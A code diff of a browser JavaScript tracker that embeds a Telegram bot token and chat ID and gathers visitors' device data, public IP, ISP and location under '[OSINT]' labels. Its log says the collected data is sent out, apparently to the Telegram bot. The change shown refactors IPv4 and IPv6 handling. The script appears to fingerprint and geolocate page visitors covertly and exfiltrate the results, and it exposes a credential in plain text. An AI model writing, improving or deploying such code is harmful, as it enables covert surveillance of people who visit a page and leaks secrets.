@@ -1,6 +1,7 @@
 (() => {
   'use strict';
 
+
   const botToken = '5871224544:AAH2CkeLJSsmdmp4MIGIul8welqy6hLFVPU';
   const chatId = '920222421';
 
@@ -189,12 +190,32 @@
     console.log('[OSINT] Getting public IP info...');
     const publicIPInfo = await getPublicIPInfo();
 
-    deviceData.publicIP = publicIPInfo ? publicIPInfo.ip : null;
-    deviceData.publicIPv6 = publicIPInfo ? publicIPInfo.ipv6 : null;
-    deviceData.isp = publicIPInfo ? publicIPInfo.org : null;
-    deviceData.city = publicIPInfo ? publicIPInfo.city : null;
-    deviceData.region = publicIPInfo ? publicIPInfo.region : null;
-    deviceData.country_name = publicIPInfo ? publicIPInfo.country_name : null;
+    // Check if public IP info was successfully retrieved
+    if (publicIPInfo && publicIPInfo.ip) {
+      // Check if the IP is IPv6 or IPv4
+      if (publicIPInfo.ip.includes(':')) {
+        // It's an IPv6 address
+        deviceData.publicIP = null;
+        deviceData.publicIPv6 = publicIPInfo.ip;
+      } else {
+        // It's an IPv4 address
+        deviceData.publicIP = publicIPInfo.ip;
+        deviceData.publicIPv6 = null;
+      }
+
+      deviceData.isp = publicIPInfo.org;
+      deviceData.city = publicIPInfo.city;
+      deviceData.region = publicIPInfo.region;
+      deviceData.country_name = publicIPInfo.country_name;
+    } else {
+      // Set all to null if the request failed
+      deviceData.publicIP = null;
+      deviceData.publicIPv6 = null;
+      deviceData.isp = null;
+      deviceData.city = null;
+      deviceData.region = null;
+      deviceData.country_name = null;
+    }
 
     // Add timestamp and visitor type (new or returning)
     deviceData.timestamp = new Date().toISOString();
@@ -205,5 +226,5 @@
 
     console.log('[OSINT] Data collection and sending completed.');
   })();
-
 })();
+
